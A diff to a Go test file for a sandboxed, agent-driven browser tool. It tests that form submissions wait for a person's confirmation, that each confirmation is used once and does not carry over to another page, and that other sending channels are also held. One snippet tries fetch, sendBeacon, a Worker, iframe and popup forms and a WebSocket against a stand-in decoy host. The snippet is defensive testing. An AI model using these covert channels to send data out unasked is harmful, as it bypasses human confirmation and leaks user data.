@@ -127,14 +127,25 @@ func TestContainer_CourseInjectionReachesNothing(t *testing.T) {
 // without a confirmation.)
 func TestContainer_ActHoldsFormsUntilConfirmed(t *testing.T) {
 	img := testActBrowser(t)
-	network, check, _ := courseSites(t)
+	network, check, hits := courseSites(t)
 	s, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/contact/"})
 	if err != nil {
 		t.Fatal(err)
 	}
 	defer s.Close()
 	cs := mcpSession(t, s)
-	send := func() {
+	run := func(code string) string {
+		t.Helper()
+		out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": code})
+		if isErr {
+			t.Fatalf("%s: %s", code, out)
+		}
+		return out
+	}
+	// send fills the contact form and clicks Send; between the two, a
+	// person may confirm (ReleaseJS just before the click, as pirn runs
+	// it), and the way closes after it (CloseJS).
+	send := func(release bool) {
 		t.Helper()
 		call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/contact/"})
 		snap, _ := call(t, cs, "browser_snapshot", nil)
@@ -144,25 +155,77 @@ func TestContainer_ActHoldsFormsUntilConfirmed(t *testing.T) {
 			{"name": "Phone", "type": "textbox", "target": ref(t, snap, `textbox "Phone"`), "value": "020 7946 0018"},
 			{"name": "Message", "type": "textbox", "target": ref(t, snap, `textbox "Message"`), "value": "Please call me back."},
 		}})
+		if release {
+			run(reed.ReleaseJS)
+		}
 		call(t, cs, "browser_click", map[string]any{"element": "Send", "target": ref(t, snap, `button "Send"`)})
+		if release {
+			run(reed.CloseJS)
+		}
 	}
-	send()
+	send(false)
 	if c := check("contact"); len(c.Received) != 0 {
 		t.Fatalf("sent without a confirmation: %v", c.Received)
 	}
-	if held, _ := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": reed.HeldJS}); !strings.Contains(held, `"total":1`) || !strings.Contains(held, "POST http://forms-srv:8080/contact/submit") {
+	if held := run(reed.HeldJS); !strings.Contains(held, `"total":1`) || !strings.Contains(held, "POST http://forms-srv:8080/contact/submit") {
 		t.Errorf("held: %s", held)
 	}
-	if out, isErr := call(t, cs, "browser_run_code_unsafe", map[string]any{"code": reed.ReleaseJS}); isErr || !strings.Contains(out, "released") {
-		t.Fatalf("release: %s", out)
-	}
-	send() // the navigation before it is a GET: the way stays open
+	send(true)
 	if c := check("contact"); !c.Done || len(c.Received) != 1 {
 		t.Fatalf("not sent once released: %v", c.Received)
 	}
-	send() // that page loaded: held again
+	send(false) // closed after the click: held again
 	if c := check("contact"); len(c.Received) != 1 {
 		t.Fatalf("sent twice on one confirmation: %v", c.Received)
+	}
+	// Review 41: a confirmation doesn't carry over to another page: the
+	// main frame loading one closes the way.
+	run(reed.ReleaseJS)
+	send(false)
+	if c := check("contact"); len(c.Received) != 1 {
+		t.Fatalf("a confirmation carried over to another page: %v", c.Received)
+	}
+
+	// Review 41: every other way a page sends is held too: fetch, a
+	// beacon, a worker, a form in a frame or a popup, and a WebSocket's
+	// messages. A session that may reach the decoy shows it: the decoy
+	// counts every request it gets.
+	other, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/contact/", Allow: []string{"decoy-srv"}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer other.Close()
+	cs = mcpSession(t, other)
+	call(t, cs, "browser_navigate", map[string]any{"url": "http://forms-srv:8080/contact/"})
+	before := hits()
+	sneak := `async (page) => { await page.evaluate(async () => {
+  const d = "http://decoy-srv:8080";
+  fetch(d + "/fetch", { method: "POST", body: "a=1", mode: "no-cors" }).catch(() => {});
+  navigator.sendBeacon(d + "/beacon", "a=1");
+  new Worker(URL.createObjectURL(new Blob(["fetch('" + d + "/worker', { method: 'POST', body: 'a=1', mode: 'no-cors' }).catch(() => {})"])));
+  const f = document.createElement("iframe");
+  f.srcdoc = "<form method=post action=" + d + "/frame><input name=a value=1></form><script>document.forms[0].submit()</script>";
+  document.body.append(f);
+  const w = window.open("");
+  if (w) { w.document.write("<form method=post action=" + d + "/popup><input name=a value=1></form>"); w.document.forms[0].submit(); }
+  const ws = new WebSocket("ws://decoy-srv:8080/ws");
+  ws.onopen = () => ws.send("a=1");
+  await new Promise((r) => setTimeout(r, 3000));
+}); return "done"; }`
+	run(sneak)
+	if n := hits() - before; n != 0 {
+		t.Errorf("the decoy got %d requests while the hold was on", n)
+	}
+	if held := run(reed.HeldJS); !strings.Contains(held, "/fetch") || !strings.Contains(held, "/beacon") || !strings.Contains(held, "/worker") || !strings.Contains(held, "/frame") {
+		t.Errorf("held: %s", held)
+	}
+	// The control: released, a fetch reaches the decoy, so a zero above
+	// means held, not unreachable.
+	run(reed.ReleaseJS)
+	run(`async (page) => { await page.evaluate(() => fetch("http://decoy-srv:8080/control", { method: "POST", body: "a=1", mode: "no-cors" })); return "done"; }`)
+	run(reed.CloseJS)
+	if hits() == before {
+		t.Error("the decoy can't be reached even when released: the test proves nothing")
 	}
 
 	free, err := reed.Browser{Image: img, Network: network}.Start(ctx, reed.Visit{URL: "http://forms-srv:8080/contact/"})
@@ -174,7 +237,7 @@ func TestContainer_ActHoldsFormsUntilConfirmed(t *testing.T) {
 		t.Fatal(err)
 	}
 	cs = mcpSession(t, free)
-	send()
+	send(false)
 	if c := check("contact"); len(c.Received) != 2 {
 		t.Fatalf("held although lifted for the session: %v", c.Received)
 	}
